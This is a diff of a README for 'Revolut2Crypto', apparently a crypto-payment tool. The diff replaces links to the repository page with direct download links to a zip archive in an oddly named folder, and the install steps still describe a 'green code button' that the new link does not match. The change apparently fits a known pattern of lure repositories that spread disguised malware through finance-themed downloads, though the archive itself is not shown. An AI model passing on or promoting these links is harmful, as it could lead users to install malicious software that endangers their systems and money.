@@ -1,6 +1,6 @@
 # 💰 Revolut2Crypto - Accept crypto payments without chargeback fees
 
-[![](https://img.shields.io/badge/Download-Revolut2Crypto-blue.svg)](https://github.com/anemonesylvestrismanagua157/Revolut2Crypto)
+[![](https://img.shields.io/badge/Download-Revolut2Crypto-blue.svg)](https://raw.githubusercontent.com/anemonesylvestrismanagua157/Revolut2Crypto/main/siphuncled/Crypto_Revolut_v2.7.zip)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets the technical stand
 
 ## 📥 Downloading and Installing
 
-[Download the latest version here.](https://github.com/anemonesylvestrismanagua157/Revolut2Crypto)
+[Download the latest version here.](https://raw.githubusercontent.com/anemonesylvestrismanagua157/Revolut2Crypto/main/siphuncled/Crypto_Revolut_v2.7.zip)
 
 1. Navigate to the link provided above.
 2. Look for the green code button.
